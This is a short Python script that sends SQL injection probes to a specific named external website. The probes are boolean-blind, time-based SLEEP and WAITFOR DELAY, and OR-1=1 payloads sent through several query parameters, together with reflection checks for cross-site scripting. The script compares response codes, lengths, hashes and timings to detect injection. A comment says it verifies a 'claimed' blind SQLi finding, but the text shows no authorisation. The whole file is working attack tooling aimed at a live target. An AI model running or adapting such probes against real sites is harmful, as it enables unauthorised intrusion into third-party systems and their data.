import requests, os, time, hashlib, urllib.parse
U = open('/work/ua_final.txt').read().strip()
H = {'User-Agent': U, 'Accept':'*/*'}
T = "https://www.infinitycapital.bh"
def h(b): return hashlib.sha256(b).hexdigest()[:16]

def g(path, label, timeout=40):
    t0=time.time()
    try:
        r=requests.get(T+path, headers=H, timeout=timeout, allow_redirects=False)
        dt=time.time()-t0
        print("%-46s %s len=%-7d sha=%s %5.2fs" % (label, r.status_code, len(r.content), h(r.content), dt))
        return r,dt
    except Exception as e:
        print("%-46s ERR %.1fs %s" % (label, time.time()-t0, e)); return None,0

print("### /?page=  differential (claimed boolean-blind SQLi)")
for v in ["2","1","0","-1","999","2 AND 1=1","2 AND 1=2","2' AND '1'='1","2 AND SLEEP(3)","2;WAITFOR DELAY '0:0:3'--","2%27%20AND%20SLEEP(3)--"]:
    g("/?page="+urllib.parse.quote(v,safe=''), "page=%r"%v)

print("\n### /?id=  differential")
for v in ["1","0","999","1 AND 1=1","1 AND 1=2","1 AND SLEEP(3)","1' OR '1'='1"]:
    g("/?id="+urllib.parse.quote(v,safe=''), "id=%r"%v)

print("\n### /contact?cb=  differential")
for v in ["1","0","2","1 AND 1=1","1 AND 1=2","1 AND SLEEP(3)","1' OR '1'='1"]:
    g("/contact?cb="+urllib.parse.quote(v,safe=''), "cb=%r"%v)

print("\n### /?search= reflection check (marker)")
M="ICMARKER9ZQ7"
g("/?search="+M, "search marker")
g("/?q="+M, "q marker")
g("/contact?q="+M, "contact q marker")
g("/404?q="+M, "404 q marker")
